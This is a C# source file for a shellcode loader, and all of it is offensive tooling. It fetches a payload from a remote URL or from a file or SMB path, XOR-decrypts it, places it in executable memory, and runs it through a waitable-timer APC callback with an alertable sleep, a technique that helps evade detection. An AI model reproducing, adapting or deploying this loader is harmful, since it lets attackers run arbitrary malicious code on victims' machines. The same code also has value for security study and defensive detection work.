﻿using System;
using System.Runtime.InteropServices;
using System.Net.Http;
using Microsoft.Win32.SafeHandles;

class Program
{
    // Constants for VirtualAlloc
    const uint MEM_COMMIT = 0x1000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern SafeWaitHandle CreateWaitableTimer(IntPtr lpTimerAttributes, bool bManualReset, string lpTimerName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool SetWaitableTimer(SafeWaitHandle hTimer, ref long pDueTime, int lPeriod, TimerAPCRoutine pfnCompletionRoutine, IntPtr pArgToCompletionRoutine, bool fResume);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint SleepEx(uint dwMilliseconds, bool bAlertable);

    delegate void TimerAPCRoutine(IntPtr lpArg, uint dwTimerLowValue, uint dwTimerHighValue);

    static void Main(string[] args)
    {
        if (args.Length < 1)
        {
            Console.WriteLine("Usage: Program.exe [-r remote_url | local_path_or_SMB_path] [-k xor_key]");
            return;
        }

        string sourcePath = args[1];
        string xorKey = null;

        if (args.Length == 4 && args[2] == "-k")
        {
            xorKey = args[3];
        }

        byte[] shellcode;

        if (args[0] == "-r")
        {
            Console.WriteLine("[Info] Attempting to download shellcode from the provided URL.");
            shellcode = DownloadShellcodeFromUrl(sourcePath);
        }
        else
        {
            Console.WriteLine("[Info] Attempting to read shellcode from the provided file path.");
            shellcode = System.IO.File.ReadAllBytes(sourcePath);
        }

        if (!string.IsNullOrEmpty(xorKey))
        {
            Console.WriteLine("[Info] Decrypting shellcode using the provided XOR key.");
            shellcode = DecryptShellcode(shellcode, xorKey);
        }

        if (shellcode == null || shellcode.Length == 0)
        {
            Console.WriteLine("[Failed] Failed to load or decrypt shellcode.");
            return;
        }
        else
        {
            Console.WriteLine("[Success] Shellcode loaded/decrypted successfully.");
        }

        IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        if (hAlloc == IntPtr.Zero)
        {
            Console.WriteLine($"[Failed] Memory allocation for shellcode failed. Error Code: {Marshal.GetLastWin32Error()}");
            return;
        }

        Marshal.Copy(shellcode, 0, hAlloc, shellcode.Length);

        long dueTime = -1;  // Execute immediately
        using (SafeWaitHandle hTimer = CreateWaitableTimer(IntPtr.Zero, false, null))
        {
            if (hTimer.IsInvalid)
            {
                Console.WriteLine($"[Failed] CreateWaitableTimer failed. Error Code: {Marshal.GetLastWin32Error()}");
                return;
            }

            TimerAPCRoutine callback = (TimerAPCRoutine)Marshal.GetDelegateForFunctionPointer(hAlloc, typeof(TimerAPCRoutine));
            bool result = SetWaitableTimer(hTimer, ref dueTime, 0, callback, IntPtr.Zero, false);

            if (!result)
            {
                Console.WriteLine($"[Failed] SetWaitableTimer failed. Error Code: {Marshal.GetLastWin32Error()}");
                return;
            }

            SleepEx(1000, true);  // Alertable sleep to allow APC to execute
        }
    }

    static byte[] DownloadShellcodeFromUrl(string url)
    {
        using (var httpClient = new HttpClient())
        {
            try
            {
                var byteArray = httpClient.GetByteArrayAsync(url).Result;
                if (byteArray != null && byteArray.Length > 0)
                {
                    Console.WriteLine("[Success] Shellcode downloaded successfully.");
                    return byteArray;
                }
                else
                {
                    Console.WriteLine("[Failed] Shellcode downloaded but the content is empty or null.");
                    return null;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Failed] Downloading shellcode: {ex.Message}");
                return null;
            }
        }
    }

    static byte[] DecryptShellcode(byte[] encryptedShellcode, string xorKey)
    {
        byte[] decryptedShellcode = new byte[encryptedShellcode.Length];
        for (int i = 0; i < encryptedShellcode.Length; i++)
        {
            decryptedShellcode[i] = (byte)(encryptedShellcode[i] ^ xorKey[i % xorKey.Length]);
        }
        return decryptedShellcode;
    }
}
